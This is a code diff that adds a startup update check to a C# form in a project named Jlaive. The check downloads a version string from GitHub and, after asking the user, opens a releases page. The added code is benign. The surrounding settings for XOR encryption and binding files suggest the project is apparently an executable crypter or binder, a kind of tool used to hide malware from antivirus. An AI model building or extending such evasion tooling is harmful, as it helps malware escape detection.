@@ -1,7 +1,9 @@
 ﻿using System;
 using System.CodeDom.Compiler;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
+using System.Net;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
@@ -47,6 +49,7 @@ namespace Jlaive
                 xorEncryption.Checked = obj.xor;
                 listBox1.Items.AddRange(obj.bindedFiles);
             }
+            Task.Factory.StartNew(CheckVersion);
             UpdateKeys(sender, e);
         }
 
@@ -197,6 +200,35 @@ namespace Jlaive
 
             MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
             buildButton.Enabled = true;
+        }
+
+        private void CheckVersion()
+        {
+            try
+            {
+                WebClient wc = new WebClient();
+                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/ch2sh/Jlaive/main/version").Trim();
+                wc.Dispose();
+                if (!File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion"))
+                {
+                    File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion", latestversion);
+                    return;
+                }
+                else
+                {
+                    string currentversion = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion").Trim();
+                    if (currentversion != latestversion)
+                    {
+                        DialogResult result = MessageBox.Show($"Jlaive {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
+                        if (result == DialogResult.Yes)
+                        {
+                            Process.Start("https://github.com/ch2sh/Jlaive/releases/tag/" + latestversion);
+                        }
+                    }
+                    return;
+                }
+            }
+            catch { }
         }
     }
 }
